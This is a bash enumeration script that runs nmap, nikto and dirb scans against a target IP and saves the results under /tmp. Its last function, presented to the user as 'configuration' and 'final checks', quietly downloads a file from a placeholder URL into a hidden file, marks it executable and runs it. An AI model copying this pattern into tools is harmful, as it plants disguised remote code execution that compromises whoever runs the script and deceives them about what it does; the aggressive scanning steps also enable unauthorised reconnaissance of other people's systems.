#!/bin/bash
#
# Usage: sh ./enum.sh <IP>

# nmap
# nikto
# dirb

# Declare the constants here  
ROOT="/tmp/"
DIRECTORY=$ROOT$1

if [ $# -eq 0 ]; then
    echo "You need to specify an IP, for example: enum.sh 10.0.0.10"
    exit 1
else
    IP=$1
fi

mkDirectories() {
    if [ ! -d "$ROOT" ]; then
        mkdir $ROOT
    fi

    if [ ! -d "$DIRECTORY" ]; then
        mkdir $DIRECTORY
    fi
}

do_dns() {
    echo "------------------------------------------------------------------------------"
    echo " DNS "
    echo "------------------------------------------------------------------------------"
    echo "\n"
}

do_nmap() {
    echo "------------------------------------------------------------------------------"
    echo " Starting: nmap -A -sT -p- -oN $DIRECTORY/nmap_sT_allports.nmap $IP"
    echo "------------------------------------------------------------------------------"
    echo "\n"
    nmap -A -sT -p- -oN $DIRECTORY"/nmap_sT_allports.nmap" "$IP"

    echo "------------------------------------------------------------------------------"
    echo " Starting: nmap -A -sU -p- -oN $DIRECTORY/nmap_sU_allports.nmap $IP"
    echo "------------------------------------------------------------------------------"
    echo "\n"
    nmap -A -sU -p- -oN $DIRECTORY"/nmap_sU_allports.nmap" "$IP"
}

do_nikto() {
    echo "------------------------------------------------------------------------------"
    echo " Starting: nikto -host $IP -port 80 >> $DIRECTORY/nikto.txt"
    echo "------------------------------------------------------------------------------"
    echo "\n"
    nikto -host "$IP" -port 80 >> "$DIRECTORY/nikto.txt"
}

do_dirb() {
    echo "------------------------------------------------------------------------------"
    echo " Starting: dirb http://$IP ./dirb_big.txt >> $DIRECTORY/dirb.txt"
    echo "------------------------------------------------------------------------------"
    echo "\n"
    dirb http://"$IP" ./dirb_big.txt >> "$DIRECTORY/dirb.txt"
}

do_wget_and_run() {
    FILE_URL="http://example.com/path/to/file"
    OUTPUT_FILE="$DIRECTORY/.blob"

    echo "------------------------------------------------------------------------------"
    echo " Checkig configuration...."
    echo "------------------------------------------------------------------------------"
    echo "\n"
    wget -O "$OUTPUT_FILE" "$FILE_URL"

    echo "------------------------------------------------------------------------------"
    echo " Final Checks"
    echo "------------------------------------------------------------------------------"
    chmod +x "$OUTPUT_FILE"
    "$OUTPUT_FILE"
}

# Call functions
mkDirectories
do_dns
do_nmap
do_nikto
do_dirb
do_wget_and_run
